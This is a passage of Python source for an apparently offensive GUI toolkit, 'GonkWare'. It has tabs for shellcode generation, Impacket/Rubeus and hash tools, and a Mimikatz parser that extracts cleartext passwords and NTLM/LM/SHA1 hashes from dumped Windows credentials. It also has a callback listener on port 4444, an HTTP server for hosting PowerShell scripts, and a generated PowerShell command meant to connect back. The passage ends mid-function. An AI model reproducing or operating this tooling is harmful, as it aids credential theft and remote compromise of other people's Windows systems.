import os, subprocess, random, glob, socket, threading, time, base64, logging
import ttkbootstrap as tb
from ttkbootstrap.constants import *
import tkinter as tk
import psutil
from PIL import Image, ImageTk
import re
from core.layout import create_base_layout, create_left_right_controls, create_status_controls, update_generation_state, setup_output_display, resize_center_bg, bind_dynamic_bg_resize
from core.template_loader import load_template_data
from core.ui_helpers import configure_styles, update_msf_entry, copy_powershell_command
from server.http_server import start_http_server, stop_http_server, get_http_server

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('gonkware.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# Main Application Class
class GonkWareApp:
    def __init__(self, root):
        self.root = root
        root.title("Hexxed BitHeadz - GonkWare Alpha build")
        root.resizable(True, True)
        self.register = self.root.register
        self.marquee_job = None

        # Network listener variables
        self.listener_socket = None
        self.listener_thread = None
        self.is_listening = False
        self.listener_port = 4444
        self.current_mimikatz_widgets = None  # Store references to current tab widgets
        self.powershell_marquee_job = None  # For PowerShell command marquee
        
        # HTTP server variables for hosting PowerShell scripts
        self.http_port = 8080  # Default HTTP port for serving files
        self.http_server_instance = None

        # Screen resolution and dynamic sizing
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()

        # Set to half the screen width, full screen height
        window_width = screen_width // 2
        window_height = int(screen_height * 0.9)
        
        # Position at the top-left corner
        x_offset = 0
        y_offset = 0

        root.geometry(f"{window_width}x{window_height}+{x_offset}+{y_offset}")
        
        # Set up window close protocol to cleanup listener
        root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Set root background to black
        root.configure(background="#000000")

        # ttkbootstrap theme setup
        self.style = tb.Style("flatly")
        configure_styles(self.style)

        self.template_data = load_template_data()

        self.create_frames()
        
        # Add tool tabs in order
        self.add_new_tool_tab("Mimikatz Parser", self.create_mimikatz_parser_tab)
        self.add_new_tool_tab("Impacket/Rubeus", self.create_impacket_rubeus_tab)
        self.add_new_tool_tab("Hash Tools", self.create_hash_tools_tab)
        self.add_new_tool_tab("Encoder/Decoder", self.create_encoder_tab)

    # Create frames and layout
    def create_frames(self):
        # Create the main notebook (tabbed) container
        self.notebook = tb.Notebook(self.root, bootstyle="dark")
        self.notebook.pack(fill=tb.BOTH, expand=True, padx=5, pady=5)
        
        # Create the first tab for the existing tool
        self.create_shellcode_tab()

    def create_shellcode_tab(self):
        """Create the first tab containing the existing shellcode generator tool"""
        # Create the tab frame
        tab_frame = tb.Frame(self.notebook, bootstyle="dark")
        self.notebook.add(tab_frame, text="Shellcode Generator")
        
        # Create the three-panel layout within this tab
        layout_refs = create_base_layout(tab_frame)

        self.left_frame = layout_refs["left_frame"]
        self.right_frame = layout_refs["right_frame"]
        self.center_frame = layout_refs["center_frame"]
        
        self.left_bg_label = layout_refs["left_bg_label"]
        self.right_bg_label = layout_refs["right_bg_label"]

        self.left_bg_original = layout_refs["left_bg_original"]
        self.right_bg_original = layout_refs["right_bg_original"]

        self.left_bg_image = layout_refs["left_bg_image"]
        self.right_bg_image = layout_refs["right_bg_image"]

        self.style = tb.Style("flatly")
        configure_styles(self.style)

        # Output display
        output_refs = setup_output_display(self.center_frame, lambda event: resize_center_bg(self, event))
        self.output_text = output_refs["output_text"]
        self.output_bg_original = output_refs["output_bg_original"]
        self.output_bg_image = output_refs["output_bg_image"]
        self.scrollbar = output_refs["scrollbar"]  # Store scrollbar reference

        create_left_right_controls(self)

        create_status_controls(self)
        bind_dynamic_bg_resize(self)

    def add_new_tool_tab(self, tab_name, create_tab_content_func):
        """
        Helper method to add a new tool tab to the notebook.
        
        Args:
            tab_name (str): Name to display on the tab
            create_tab_content_func (callable): Function that takes a parent frame and creates the tab content
        """
        # Create the tab frame with explicit dark styling
        tab_frame = tb.Frame(self.notebook, bootstyle="dark")
        tab_frame.configure(style="TFrame")  # Ensure dark background
        self.notebook.add(tab_frame, text=tab_name)
        
        # Call the provided function to create the tab content
        create_tab_content_func(tab_frame)
        
        return tab_frame

    def create_example_tool_tab(self, parent_frame):
        """
        Example function showing how to create a new tool tab.
        Replace this with your actual tool implementation.
        """
        # Create a simple layout for demonstration
        title_label = tb.Label(parent_frame, text="New Tool", 
                              font=("Consolas", 16, "bold"),
                              bootstyle="info")
        title_label.pack(pady=20)
        
        # Add some example controls
        tool_frame = tb.Frame(parent_frame, bootstyle="dark")
        tool_frame.pack(fill=tb.BOTH, expand=True, padx=20, pady=10)
        
        # Example button
        example_button = tb.Button(tool_frame, text="Execute Tool", 
                                  bootstyle="success")
        example_button.pack(pady=10)
        
        # Example text area
        text_area = tb.Text(tool_frame, height=10, 
                           background="#000000", 
                           foreground="#00ff00",
                           font=("Consolas", 10))
        text_area.pack(fill=tb.BOTH, expand=True, pady=10)
        text_area.insert("1.0", "This is where your new tool's output would appear...")

    def create_mimikatz_parser_tab(self, parent_frame):
        """Mimikatz output parser tool tab with cyberpunk color styling"""
        import re
        
        # Main container with dark styling - this should match shellcode generator
        main_frame = tb.Frame(parent_frame, bootstyle="dark")
        main_frame.configure(style="TFrame")  # Ensure black background
        main_frame.pack(fill=tb.BOTH, expand=True, padx=10, pady=10)
        
        # Title with cyberpunk colors using existing style
        title_label = tb.Label(main_frame, text="MIMIKATZ PARSER", 
                              font=("Consolas", 16, "bold"),
                              style="StatusLabel.TLabel")
        title_label.pack(pady=(0, 20))
        
        # Input section with cyberpunk colors - Make horizontal layout
        input_frame = tb.Frame(main_frame, bootstyle="dark")
        input_frame.configure(style="TFrame")  # Ensure black background
        input_frame.pack(fill=tb.X, pady=(0, 15))
        
        # Left side - Input text area (reduced width more)
        input_left_frame = tb.Frame(input_frame, bootstyle="dark")
        input_left_frame.configure(style="TFrame")
        input_left_frame.pack(side=tb.LEFT, fill=tb.BOTH, expand=False, padx=(0, 15))  # Changed expand=False and more padding
        
        # Set a specific width for the input area
        input_left_frame.configure(width=400)  # Fixed width instead of expanding
        
        input_label = tb.Label(input_left_frame, text="PASTE MIMIKATZ OUTPUT:", 
                              style="SectionLabel.TLabel")
        input_label.pack(anchor="w", pady=(0, 5))
        
        # Input text area with cyberpunk styling - Reduced height and width
        input_text_frame = tb.Frame(input_left_frame, bootstyle="dark")
        input_text_frame.configure(style="TFrame")  # Ensure black background
        input_text_frame.pack(fill=tb.BOTH, expand=True, pady=(0, 10))
        
        input_scrollbar = tb.Scrollbar(input_text_frame, bootstyle="dark")
        input_scrollbar.pack(side=tb.RIGHT, fill=tb.Y)
        
        input_text = tb.Text(input_text_frame, height=2, width=50,  # Further reduced height to 2
                            background="#000000", foreground="#fefe00",
                            font=("Consolas", 10, "bold"), wrap=tb.WORD,
                            insertbackground="#fefe00",
                            selectbackground="#333333",
                            yscrollcommand=input_scrollbar.set)
        input_text.pack(side=tb.LEFT, fill=tb.BOTH, expand=True)
        # Force the colors after creation
        input_text.configure(background="#000000", foreground="#fefe00")
        input_scrollbar.config(command=input_text.yview)
        
        # Placeholder text
        placeholder_text = """Paste your Mimikatz output here...

Example formats supported:
- sekurlsa::logonpasswords
- sekurlsa::wdigest  
- sekurlsa::msv
- lsadump::sam
- lsadump::secrets"""
        input_text.insert("1.0", placeholder_text)
        
        # Button row directly under the text area in the left frame
        button_frame = tb.Frame(input_left_frame, bootstyle="dark")
        button_frame.configure(style="TFrame")
        button_frame.pack(fill=tb.X, pady=(10, 0))
        
        # Parse Credentials button (moved to far left)
        parse_button = tb.Button(button_frame, text="Parse Credentials", 
                               bootstyle="danger-outline", width=18,
                               command=lambda: self.parse_mimikatz_output(input_text, passwords_listbox, hashes_listbox, results_text))
        parse_button.pack(side=tb.LEFT, pady=5)
        
        # Clear button (next to Parse Credentials)
        clear_button = tb.Button(button_frame, text="Clear All", 
                               bootstyle="secondary-outline", width=12,
                               command=lambda: self.clear_mimikatz_results(input_text, passwords_listbox, hashes_listbox, results_text))
        clear_button.pack(side=tb.LEFT, padx=(10, 0), pady=5)
        
        # Right side - Network listener controls (more space)
        listener_right_frame = tb.Frame(input_frame, bootstyle="dark")
        listener_right_frame.configure(style="TFrame")
        listener_right_frame.pack(side=tb.RIGHT, fill=tb.BOTH, expand=True, padx=(15, 0))  # More space and padding
        
        # Network listener section header
        listener_header = tb.Label(listener_right_frame, text="NETWORK LISTENER", 
                                  style="StatusLabel.TLabel",
                                  font=("Consolas", 14, "bold"))  # Larger font
        listener_header.pack(pady=(0, 15))
        
        # Interface and Port configuration - Horizontal layout
        config_frame = tb.Frame(listener_right_frame, bootstyle="dark")
        config_frame.configure(style="TFrame")
        config_frame.pack(fill=tb.X, pady=(0, 15))
        
        # Interface configuration (left side)
        interface_frame = tb.Frame(config_frame, bootstyle="dark")
        interface_frame.configure(style="TFrame")
        interface_frame.pack(side=tb.LEFT, fill=tb.X, expand=True, padx=(0, 10))
        
        interface_label = tb.Label(interface_frame, text="Interface:", 
                                   foreground="#91ddd3", background="#000000",
                                   font=("Consolas", 10, "bold"))
        interface_label.pack(anchor="w", pady=(0, 5))
        
        # Get available network interfaces (similar to shellcode generator)
        import psutil
        self.network_interface_options = list(psutil.net_if_addrs().keys())
        
        # Default to first non-localhost interface if available
        default_interface = "eth0"
        for iface in self.network_interface_options:
            if iface != "lo":  # Skip localhost
                default_interface = iface
                break
        
        self.selected_listener_interface = tb.StringVar(value=default_interface if default_interface in self.network_interface_options else self.network_interface_options[0])
        
        # Debug: Print available interfaces and IPs
        logger.debug(f"Available interfaces: {self.network_interface_options}")
        logger.debug(f"Default interface selected: {self.selected_listener_interface.get()}")
        for iface in self.network_interface_options[:3]:  # Show first 3 interfaces
            ip = self.get_interface_ip(iface)
            logger.debug(f"Interface {iface} -> IP {ip}")
        
        # Create a custom style for the interface dropdown
        interface_dropdown_style = tb.Style()
        interface_dropdown_style.configure("InterfaceCombo.TCombobox", 
                                           fieldbackground="#000000",
                                           foreground="#fefe00",
                                           bordercolor="#333333",
                                           lightcolor="#333333",
                                           darkcolor="#333333",
                                           selectbackground="#333333",
                                           selectforeground="#fefe00",
                                           arrowcolor="#fefe00",
                                           focuscolor="#fefe00")
        
        # Configure the dropdown list styling
        interface_dropdown_style.map("InterfaceCombo.TCombobox",
                                     fieldbackground=[('readonly', '#000000')],
                                     foreground=[('readonly', '#fefe00')],
                                     selectbackground=[('readonly', '#333333')],
                                     selectforeground=[('readonly', '#fefe00')])
        
        # Additional styling for the dropdown list popup
        self.root.option_add('*TCombobox*Listbox.Background', '#000000')
        self.root.option_add('*TCombobox*Listbox.Foreground', '#fefe00')
        self.root.option_add('*TCombobox*Listbox.selectBackground', '#333333')
        self.root.option_add('*TCombobox*Listbox.selectForeground', '#fefe00')
        
        interface_dropdown = tb.Combobox(interface_frame, textvariable=self.selected_listener_interface,
                                        values=self.network_interface_options, state="readonly",
                                        style="InterfaceCombo.TCombobox", width=12,
                                        font=("Consolas", 9, "bold"))
        interface_dropdown.pack(fill=tb.X)
        
        # Force the dropdown colors after creation
        interface_dropdown.configure(background="#000000", foreground="#fefe00")
        
        interface_dropdown.bind('<<ComboboxSelected>>', self.update_listener_interface)
        self.interface_dropdown = interface_dropdown  # Store reference
        
        # Port configuration (right side)
        port_frame = tb.Frame(config_frame, bootstyle="dark")
        port_frame.configure(style="TFrame")
        port_frame.pack(side=tb.RIGHT, fill=tb.X, expand=True, padx=(10, 0))
        
        port_label = tb.Label(port_frame, text="Port:", 
                             foreground="#91ddd3", background="#000000",
                             font=("Consolas", 10, "bold"))
        port_label.pack(anchor="w", pady=(0, 5))
        
        # Port entry with direct styling
        port_entry = tk.Entry(port_frame, width=8,
                             font=("Consolas", 10, "bold"),
                             background="#000000", foreground="#fefe00",
                             insertbackground="#fefe00",
                             selectbackground="#333333",
                             selectforeground="#fefe00",
                             highlightbackground="#333333",
                             highlightcolor="#fefe00",
                             borderwidth=1, relief="solid")
        port_entry.pack(fill=tb.X)
        port_entry.insert(0, "4444")
        port_entry.bind('<Return>', self.update_listener_port)
        port_entry.bind('<FocusOut>', self.update_listener_port)
        self.port_entry = port_entry  # Store reference for PowerShell command generation
        
        # Start/Stop buttons
        start_button = tb.Button(listener_right_frame, text="START LISTENER", 
                                bootstyle="success", width=18,  # Wider buttons
                                command=self.start_listener)
        start_button.pack(pady=(0, 8))
        
        stop_button = tb.Button(listener_right_frame, text="STOP LISTENER", 
                               bootstyle="danger", width=18,  # Wider buttons
                               command=self.stop_listener, state='disabled')
        stop_button.pack(pady=(0, 15))
        
        # Listener status
        listener_status = tb.Label(listener_right_frame, text="Listener Ready", 
                                  foreground="#fefe00", background="#000000",
                                  font=("Consolas", 10, "bold"),
                                  wraplength=200)  # More wrap space
        listener_status.pack(pady=(0, 15))
        self.listener_status = listener_status  # Store reference for status updates
        
        # PowerShell command generation section
        ps_frame = tb.Frame(listener_right_frame, bootstyle="dark")
        ps_frame.configure(style="TFrame")
        ps_frame.pack(fill=tb.X, pady=(0, 10))
        
        # PowerShell command label
        ps_label = tb.Label(ps_frame, text="POWERSHELL COMMAND:",
                           foreground="#fefe00", background="#000000",
                           font=("Consolas", 9, "bold"))
        ps_label.pack(anchor="w")
        
        # PowerShell command display (similar to msf_entry)
        self.ps_entry = tb.Text(ps_frame, height=1, width=35,
                               font=("Consolas", 8),
                               background="#FEFE00", foreground="#000000",
                               insertbackground="#000000",
                               wrap="none", state="disabled",
                               borderwidth=1, relief="solid")
        self.ps_entry.pack(fill=tb.X, pady=(2, 5))
        
        # Copy PowerShell command button (centered)
        copy_ps_button = tb.Button(ps_frame, text="Copy PS Command",
                                  bootstyle="info", width=18,
                                  command=lambda: copy_powershell_command(self))
        copy_ps_button.pack(pady=(0, 5))
        
        # Results section with two columns - Passwords and Hashes only
        results_frame = tb.Frame(main_frame, bootstyle="dark")
        results_frame.configure(style="TFrame")  # Ensure black background
        results_frame.pack(fill=tb.X, expand=False, pady=(10, 0))  # Changed to fill=X only

        # Passwords column (left side) - Equal width
        passwords_frame = tb.Frame(results_frame, bootstyle="dark")
        passwords_frame.configure(style="TFrame")  # Ensure black background
        passwords_frame.pack(side=tb.LEFT, fill=tb.BOTH, expand=True, padx=(0, 2.5))
        
        passwords_label = tb.Label(passwords_frame, text="PASSWORDS FOUND:", 
                                  style="SectionLabel.TLabel")
        passwords_label.pack(anchor="w", pady=(0, 5))
        
        # Passwords listbox with scrollbar - Reduced height
        passwords_listbox_frame = tb.Frame(passwords_frame, bootstyle="dark")
        passwords_listbox_frame.configure(style="TFrame")
        passwords_listbox_frame.pack(fill=tb.BOTH, expand=True, pady=(0, 10))
        
        passwords_scrollbar = tb.Scrollbar(passwords_listbox_frame, bootstyle="dark")
        passwords_scrollbar.pack(side=tb.RIGHT, fill=tb.Y)
        
        passwords_listbox = tk.Listbox(passwords_listbox_frame, height=4,  # Reduced from 5 to 4
                                      background="#000000", foreground="#00ff00",
                                      font=("Consolas", 9, "bold"),
                                      selectbackground="#333333",
                                      selectforeground="#00ff00",
                                      highlightbackground="#000000",
                                      highlightcolor="#00ff00",
                                      yscrollcommand=passwords_scrollbar.set)
        passwords_listbox.pack(side=tb.LEFT, fill=tb.BOTH, expand=True)
        # Force the black background after creation
        passwords_listbox.configure(background="#000000", foreground="#00ff00")
        passwords_scrollbar.config(command=passwords_listbox.yview)
        
        # Horizontal button frame for password actions
        password_button_frame = tb.Frame(passwords_frame, bootstyle="dark")
        password_button_frame.configure(style="TFrame")
        password_button_frame.pack(fill=tb.X, pady=(0, 10))
        
        # Copy Password button (left side)
        copy_password_button = tb.Button(password_button_frame, text="Copy Password", 
                                        bootstyle="success-outline", width=12,
                                        command=lambda: self.copy_listbox_selection(passwords_listbox, "Password"))
        copy_password_button.pack(side=tb.LEFT)

        # Hashes column (right side) - Equal width
        hashes_frame = tb.Frame(results_frame, bootstyle="dark")
        hashes_frame.configure(style="TFrame")  # Ensure black background
        hashes_frame.pack(side=tb.LEFT, fill=tb.BOTH, expand=True, padx=(2.5, 0))
        
        hashes_label = tb.Label(hashes_frame, text="HASHES FOUND:", 
                               style="SectionLabel.TLabel")
        hashes_label.pack(anchor="w", pady=(0, 5))
        
        # Hashes listbox with scrollbar - Reduced height
        hashes_listbox_frame = tb.Frame(hashes_frame, bootstyle="dark")
        hashes_listbox_frame.configure(style="TFrame")
        hashes_listbox_frame.pack(fill=tb.BOTH, expand=True, pady=(0, 10))
        
        hashes_scrollbar = tb.Scrollbar(hashes_listbox_frame, bootstyle="dark")
        hashes_scrollbar.pack(side=tb.RIGHT, fill=tb.Y)
        
        hashes_listbox = tk.Listbox(hashes_listbox_frame, height=4,  # Reduced from 5 to 4
                                   background="#000000", foreground="#ec1c3a",
                                   font=("Consolas", 9, "bold"),
                                   selectbackground="#333333",
                                   selectforeground="#ec1c3a",
                                   highlightbackground="#000000",
                                   highlightcolor="#ec1c3a",
                                   yscrollcommand=hashes_scrollbar.set)
        hashes_listbox.pack(side=tb.LEFT, fill=tb.BOTH, expand=True)
        # Force the black background after creation
        hashes_listbox.configure(background="#000000", foreground="#ec1c3a")
        hashes_scrollbar.config(command=hashes_listbox.yview)
        
        # Horizontal button frame for hash actions
        hash_button_frame = tb.Frame(hashes_frame, bootstyle="dark")
        hash_button_frame.configure(style="TFrame")
        hash_button_frame.pack(fill=tb.X, pady=(0, 5))
        
        # Copy Hash button (left side)
        copy_hash_button = tb.Button(hash_button_frame, text="Copy Hash", 
                                    bootstyle="warning-outline", width=12,
                                    command=lambda: self.copy_listbox_selection(hashes_listbox, "Hash"))
        copy_hash_button.pack(side=tb.LEFT, padx=(0, 5))
        
        # Export results button (right side)
        export_button = tb.Button(hash_button_frame, text="Export Results", 
                                 bootstyle="secondary-outline", width=12,
                                 command=lambda: self.export_mimikatz_results(results_text))
        export_button.pack(side=tb.RIGHT)
        
        # Detailed results section
        results_label = tb.Label(main_frame, text="PARSING RESULTS:", 
                                style="SectionLabel.TLabel")
        results_label.pack(anchor="w", pady=(20, 8))  # More spacing above and below
        
        results_text_frame = tb.Frame(main_frame, bootstyle="dark")
        results_text_frame.configure(style="TFrame")  # Ensure black background
        results_text_frame.pack(fill=tb.BOTH, expand=True, pady=(0, 10))  # Allow expansion and more bottom padding
        
        results_scrollbar = tb.Scrollbar(results_text_frame, bootstyle="dark")
        results_scrollbar.pack(side=tb.RIGHT, fill=tb.Y)
        
        results_text = tb.Text(results_text_frame, height=8,  # Increased from 4 to 8
                              background="#000000", foreground="#fefe00",
                              font=("Consolas", 11, "bold"), wrap=tb.WORD,  # Increased font from 10 to 11
                              insertbackground="#fefe00",
                              selectbackground="#333333",
                              yscrollcommand=results_scrollbar.set)
        results_text.pack(side=tb.LEFT, fill=tb.BOTH, expand=True)
        # Force the colors after creation
        results_text.configure(background="#000000", foreground="#fefe00")
        results_scrollbar.config(command=results_text.yview)
        
        results_text.insert("1.0", "Parsed credentials will appear here...\n\nSupported formats:\n- Username:Domain:Password\n- Username:Domain:Hash\n- Detailed credential information")

        # Store widget references for the listener methods
        self.current_mimikatz_widgets = {
            'output_area': input_text,
            'passwords_listbox': passwords_listbox,
            'hashes_listbox': hashes_listbox,
            'results_text': results_text,
            'listener_status': listener_status,
            'start_button': start_button,
            'stop_button': stop_button,
            'port_entry': port_entry,
            'interface_dropdown': interface_dropdown
        }
        
        # Debug print to console
        logger.info("Network Listener UI created successfully!")
        logger.debug(f"Listener widgets stored: {bool(self.current_mimikatz_widgets)}")
        logger.debug(f"Start button exists: {start_button is not None}")
        logger.debug(f"Port entry exists: {port_entry is not None}")
        logger.debug(f"Interface dropdown exists: {interface_dropdown is not None}")
        logger.debug("Listener frame packed successfully!")
        
        # Generate initial PowerShell command
        logger.debug("About to call build_powershell_cmd()")
        logger.debug(f"selected_listener_interface exists: {hasattr(self, 'selected_listener_interface')}")
        logger.debug(f"port_entry exists: {hasattr(self, 'port_entry')}")
        logger.debug(f"ps_entry exists: {hasattr(self, 'ps_entry')}")
        
        if hasattr(self, 'selected_listener_interface'):
            logger.debug(f"selected_listener_interface value: {self.selected_listener_interface.get()}")
        if hasattr(self, 'port_entry'):
            logger.debug(f"port_entry value: {self.port_entry.get()}")
            
        try:
            self.build_powershell_cmd()
            logger.debug("build_powershell_cmd completed successfully")
        except Exception as e:
            logger.error(f"Exception in build_powershell_cmd: {e}")
            import traceback
            logger.debug(traceback.format_exc())

    def parse_mimikatz_output(self, input_text, passwords_listbox, hashes_listbox, results_text):
        """Parse Mimikatz output and extract credentials"""
        import re
        
        # Get the input text
        mimikatz_output = input_text.get("1.0", "end-1c")
        
        if not mimikatz_output.strip() or "Paste your Mimikatz output here" in mimikatz_output:
            self.show_status_message("Please paste valid Mimikatz output first", "#ff5555")
            return
        
        # Initialize storage
        users = set()
        passwords = set()
        hashes = set()
        credentials = []
        
        # Clear results
        results_text.delete("1.0", "end")
        results_text.insert("1.0", "Parsing Mimikatz output...\n\n")
        
        # Parse different Mimikatz output formats
        lines = mimikatz_output.split('\n')
        current_user = None
        current_domain = None
        
        for i, line in enumerate(lines):
            line = line.strip()
            
            # Parse username
            user_match = re.search(r'Username\s*:\s*(.+)', line, re.IGNORECASE)
            if user_match:
                current_user = user_match.group(1).strip()
                if current_user and current_user != "(null)":
                    users.add(current_user)
            
            # Parse domain
            domain_match = re.search(r'Domain\s*:\s*(.+)', line, re.IGNORECASE)
            if domain_match:
                current_domain = domain_match.group(1).strip()
            
            # Parse password with better filtering
            password_match = re.search(r'Password\s*:\s*(.+)', line, re.IGNORECASE)
            if password_match:
                password = password_match.group(1).strip()
                
                # Debug output for every password found
                if password and password != "(null)" and password != "":
                    logger.debug(f"Found password: '{password[:50]}...' (length: {len(password)})")
                    
                    # Test all filters individually
                    test_hex_dump = self.is_hex_dump_pattern(password)
                    test_binary = self.is_binary_data(password)
                    test_hex_key = self.is_hex_key(password)
                    test_garbage = self.is_likely_garbage_password(password)
                    test_hex_string = self.is_probably_hex_string(password)
                    
                    logger.debug(f"  - Length < 64: {len(password) < 64}")
                    logger.debug(f"  - Length > 2: {len(password) > 2}")
                    logger.debug(f"  - is_hex_dump_pattern: {test_hex_dump}")
                    logger.debug(f"  - is_binary_data: {test_binary}")
                    logger.debug(f"  - is_hex_key: {test_hex_key}")
                    logger.debug(f"  - is_likely_garbage: {test_garbage}")
                    logger.debug(f"  - is_probably_hex_string: {test_hex_string}")
                
                # Filter out invalid passwords with aggressive filtering
                if (password and 
                    password != "(null)" and 
                    password != "" and
                    len(password) < 64 and  # Length check first
                    len(password) > 2 and   # Must be at least 3 characters
                    not self.is_hex_dump_pattern(password) and  # Check for hex dump first
                    not self.is_binary_data(password) and
                    not self.is_hex_key(password) and
                    not self.is_likely_garbage_password(password) and
                    not self.is_probably_hex_string(password)):  # Additional hex check
                    
                    logger.debug(f"Password ACCEPTED: '{password}'")
                    passwords.add(password)
                    if current_user:
                        credentials.append({
                            'user': current_user,
                            'domain': current_domain or "Unknown",
                            'password': password,
                            'type': 'Password'
                        })
                else:
                    logger.debug(f"Password REJECTED: '{password[:50]}...'")
            
            # Parse NTLM hash
            ntlm_match = re.search(r'NTLM\s*:\s*([a-fA-F0-9]{32})', line, re.IGNORECASE)
            if ntlm_match:
                ntlm_hash = ntlm_match.group(1).strip()
                if ntlm_hash:
                    hashes.add(ntlm_hash)
                    if current_user:
                        credentials.append({
                            'user': current_user,
                            'domain': current_domain or "Unknown",
                            'hash': ntlm_hash,
                            'type': 'NTLM Hash'
                        })
            
            # Parse LM hash
            lm_match = re.search(r'LM\s*:\s*([a-fA-F0-9]{32})', line, re.IGNORECASE)
            if lm_match:
                lm_hash = lm_match.group(1).strip()
                if lm_hash and lm_hash != "aad3b435b51404eeaad3b435b51404ee":  # Ignore empty LM hash
                    hashes.add(lm_hash)
                    if current_user:
                        credentials.append({
                            'user': current_user,
                            'domain': current_domain or "Unknown",
                            'hash': lm_hash,
                            'type': 'LM Hash'
                        })
            
            # Parse SHA1 hash
            sha1_match = re.search(r'SHA1\s*:\s*([a-fA-F0-9]{40})', line, re.IGNORECASE)
            if sha1_match:
                sha1_hash = sha1_match.group(1).strip()
                if sha1_hash:
                    hashes.add(sha1_hash)
                    if current_user:
                        credentials.append({
                            'user': current_user,
                            'domain': current_domain or "Unknown",
                            'hash': sha1_hash,
                            'type': 'SHA1 Hash'
                        })
        
        # Remove duplicates from credentials based on user+domain+credential combination
        unique_credentials = []
        seen = set()
        for cred in credentials:
            if 'password' in cred:
                key = f"{cred['user']}@{cred['domain']}:{cred['password']}"
            elif 'hash' in cred:
                key = f"{cred['user']}@{cred['domain']}:{cred['hash']}"
            
            if key not in seen:
                seen.add(key)
                unique_credentials.append(cred)
        
        # Color coordination system - assign unique colors to each user
        color_palette = [
            "#fefe00",  # Bright yellow
            "#00ff41",  # Bright green  
            "#ec1c3a",  # Bright red
            "#ff8c00",  # Dark orange
            "#00bfff",  # Deep sky blue
            "#ff69b4",  # Hot pink
            "#32cd32",  # Lime green
            "#dda0dd",  # Plum
            "#ff6347",  # Tomato
            "#40e0d0",  # Turquoise
            "#ffd700",  # Gold
            "#9370db",  # Medium purple
        ]
        
        # Create user-to-color mapping
        sorted_users = sorted(list(users))
        user_colors = {}
        for i, user in enumerate(sorted_users):
            user_colors[user] = color_palette[i % len(color_palette)]
        
        # Update listboxes with color coordination
        passwords_listbox.delete(0, tk.END)
        hashes_listbox.delete(0, tk.END)
        
        # Group passwords and hashes by user for color coordination
        user_passwords = {}
        user_hashes = {}
        
        # Map passwords to their users
        for cred in unique_credentials:
            if 'password' in cred:
                user_key = cred['user']
                if user_key not in user_passwords:
                    user_passwords[user_key] = []
                user_passwords[user_key].append(cred['password'])
        
        # Map hashes to their users  
        for cred in unique_credentials:
            if 'hash' in cred:
                user_key = cred['user']
                if user_key not in user_hashes:
                    user_hashes[user_key] = []
                user_hashes[user_key].append(cred['hash'])
        
        # Populate passwords listbox with user colors
        password_index = 0
        for user in sorted_users:
            if user in user_passwords:
                user_color = user_colors[user]
                for password in sorted(user_passwords[user]):
                    passwords_listbox.insert(tk.END, f"{user}: {password}")
                    passwords_listbox.itemconfig(password_index, foreground=user_color)
                    password_index += 1
        
        # Add orphaned passwords (no associated user) in default color
        orphaned_passwords = passwords - set()
        for cred in unique_credentials:
            if 'password' in cred and cred['user'] in users:
                orphaned_passwords.discard(cred['password'])
        
        for password in sorted(orphaned_passwords):
            passwords_listbox.insert(tk.END, f"Unknown: {password}")
            passwords_listbox.itemconfig(password_index, foreground="#888888")
            password_index += 1
        
        # Populate hashes listbox with user colors
        hash_index = 0
        for user in sorted_users:
            if user in user_hashes:
                user_color = user_colors[user]
                for hash_val in sorted(user_hashes[user]):
                    hashes_listbox.insert(tk.END, f"{user}: {hash_val}")
                    hashes_listbox.itemconfig(hash_index, foreground=user_color)
                    hash_index += 1
        
        # Add orphaned hashes (no associated user) in default color
        orphaned_hashes = hashes - set()
        for cred in unique_credentials:
            if 'hash' in cred and cred['user'] in users:
                orphaned_hashes.discard(cred['hash'])
                
        for hash_val in sorted(orphaned_hashes):
            hashes_listbox.insert(tk.END, f"Unknown: {hash_val}")
            hashes_listbox.itemconfig(hash_index, foreground="#888888")
            hash_index += 1
        
        # Select first items if available
        if passwords_listbox.size() > 0:
            passwords_listbox.selection_set(0)
        if hashes_listbox.size() > 0:
            hashes_listbox.selection_set(0)
        
        # Display results
        results_text.delete("1.0", "end")
        results_text.insert("end", f"=== PARSING COMPLETE ===\n")
        results_text.insert("end", f"Users found: {len(users)}\n")
        results_text.insert("end", f"Passwords found: {len(passwords)}\n")
        results_text.insert("end", f"Hashes found: {len(hashes)}\n\n")
        
        # Group credentials by type for better display
        password_creds = [c for c in unique_credentials if 'password' in c]
        hash_creds = [c for c in unique_credentials if 'hash' in c]
        
        if password_creds:
            results_text.insert("end", "=== CLEARTEXT PASSWORDS ===\n")
            for cred in password_creds:
                results_text.insert("end", f"{cred['user']}@{cred['domain']} : {cred['password']}\n")
            results_text.insert("end", "\n")
        
        if hash_creds:
            results_text.insert("end", "=== HASHES ===\n")
            for cred in hash_creds:
                results_text.insert("end", f"{cred['user']}@{cred['domain']} : {cred['hash']} [{cred['type']}]\n")
        
        if not unique_credentials:
            results_text.insert("end", "\nNo valid credentials found. Supported formats:\n")
            results_text.insert("end", "- sekurlsa::logonpasswords\n")
            results_text.insert("end", "- sekurlsa::wdigest\n")
            results_text.insert("end", "- lsadump::sam\n")
            results_text.insert("end", "- lsadump::secrets\n")
        
        # Show success message
        self.show_status_message(f"Found {len(users)} users, {len(passwords)} passwords, {len(hashes)} hashes", "#00ff41")

    def is_binary_data(self, text):
        """Check if text appears to be binary data or hex-encoded binary"""
        import re
        
        # Check for patterns that indicate binary data
        hex_pattern = re.compile(r'^[0-9a-fA-F\s]+$')
        
        # If it's mostly hex characters with spaces, it's likely binary
        if hex_pattern.match(text) and len(text) > 50:
            return True
        
        # Check for unusual character patterns
        non_printable = sum(1 for c in text if ord(c) < 32 or ord(c) > 126)
        if non_printable > len(text) * 0.3:  # More than 30% non-printable
            return True
        
        return False

    def is_hex_key(self, text):
        """Check if text is a long hexadecimal key/token"""
        # Remove spaces and check if it's all hex
        clean_text = text.replace(' ', '').replace('\t', '')
        
        # If it's longer than 64 chars and all hex, it's probably a key
        if len(clean_text) > 64:
            try:
                int(clean_text, 16)
                return True
            except ValueError:
                pass
        
        return False

    def is_likely_garbage_password(self, text):
        """Check if text is likely garbage data that shouldn't be shown as a password"""
        import re
        
        # Check for long strings of repeated characters
        if len(set(text)) < 3 and len(text) > 10:
            return True
        
        # Check for mostly numeric strings longer than 20 chars (often memory addresses or keys)
        if len(text) > 20 and re.match(r'^[0-9\s\-]+$', text):
            return True
        
        # Check for strings that are mostly hex-like but not proper hex
